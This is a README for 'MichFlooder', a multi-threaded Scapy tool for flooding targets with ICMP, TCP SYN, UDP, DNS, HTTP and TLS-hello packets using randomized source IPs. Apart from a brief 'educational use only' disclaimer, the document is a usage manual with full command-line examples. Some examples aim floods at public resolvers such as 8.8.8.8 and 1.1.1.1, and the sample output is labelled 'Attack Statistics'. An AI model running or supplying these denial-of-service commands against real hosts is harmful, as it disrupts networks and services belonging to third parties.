# MichFlooder v1.0

**License:** MIT  
**Description:** Multi-threaded packet flooder using Scapy, supporting ICMP, TCP, UDP, DNS, HTTP, and HTTPS.

---

## ⚠️ Disclaimer

This tool is intended for **educational and testing purposes only**.  
**Do not use on any network without explicit permission.**

---

## 🚀 Features

- Supports ICMP, TCP SYN, UDP, DNS, HTTP, and HTTPS protocols.
- Custom domain querying for DNS/HTTP(S).
- Randomized IPs, ports, and payloads.
- Adjustable packet size, interval, thread count, and total packet count.
- Multi-threaded for maximum throughput.
- Statistics reporting: packet count, total data sent, time elapsed, and throughput.

---

## 🛠️ Requirements

- Python 3.7+
- [Scapy](https://scapy.net/)

Install with:

```bash
pip install scapy
````

---

## 📦 Usage

```bash
python michflooder.py [options] TARGET
```

### 🔹 Positional Argument

| Name   | Description                                                   |
| ------ | ------------------------------------------------------------- |
| target | Target IP or CIDR subnet (e.g., `192.168.1.1`, `10.0.0.0/24`) |

---

### 🔸 Optional Arguments

| Flag(s)            | Description                                                                           |
| ------------------ | ------------------------------------------------------------------------------------- |
| `-p`, `--port`     | Target port(s). Accepts single port (`80`), ranges (`20-25`), or lists (`53,80,443`). |
| `-n`, `--count`    | Number of packets to send per thread (default: infinite)                              |
| `-s`, `--size`     | Minimum packet size in bytes (max: 1450)                                              |
| `-t`, `--threads`  | Number of threads to use (default: number of CPU cores)                               |
| `-i`, `--interval` | Interval (in seconds) between packets (default: `0`)                                  |
| `-d`, `--domain`   | Domain to include in DNS/HTTP(S) requests (required for `--dns`, `--http`) |

---

### 🔻 Protocol Selection (Mutually Exclusive)

| Flag(s)         | Protocol     | Notes                                 |
| --------------- | ------------ | ------------------------------------- |
| `-P`, `--ICMP`  | ICMP (Ping)  | Default if no other protocol selected |
| `-T`, `--TCP`   | TCP SYN      | Requires `--port`                     |
| `-U`, `--UDP`   | UDP          | Requires `--port`                     |
| `-D`, `--DNS`   | DNS over UDP | Requires `--domain`                   |
| `-H`, `--HTTP`  | HTTP GET     | Requires `--domain`                   |
| `-S`, `--HTTPS` | TLS Hello    | Simulated TLS, uses raw binary format |

---

## 🔍 Examples

### ICMP Ping Flood (Default Protocol)

```bash
python michflooder.py -n 1000 -t 4 192.168.1.1
```

### TCP SYN Flood on Port 80

```bash
python michflooder.py -T -p 80 -n 1000 -t 8 192.168.1.50
```

### UDP Flood on Range of Ports

```bash
python michflooder.py -U -p 1000-1010 -t 2 10.10.10.10
```

### DNS Query Flood to Public Resolver

```bash
python michflooder.py -D -d example.com -n 1000 8.8.8.8
```

### HTTP Flood on Custom Port

```bash
python michflooder.py -H -d example.org -p 8080 -n 500 192.168.0.99
```

### HTTPS TLS Hello Flood

```bash
python michflooder.py -S -d google.com -p 443 -n 200 1.1.1.1
```

---

## 📊 Output Sample

```
======================
==                  ==
== MichFlooder v1.0 ==
==  By MichelCohen  ==
==                  ==
======================

target    = 192.168.1.1
protocol  = icmp
threads   = 4
count     = 1000

Press Enter to start sending...

[12:00:01] Sending packets...

===== Attack Statistics =====
Start Time   : 12:00:01
End Time     : 12:00:05
Time Taken   : 0:00:04
Packets Sent : 4,000
Total Volume : 2.25 MB
Avg          : 0.56 MB/s
               1,000.00 PPS
```

---

## 📄 License

This project is licensed under the [MIT License](LICENSE).

---

## 🙋‍♂️ Acknowledgments

Built using [Scapy](https://scapy.net/).

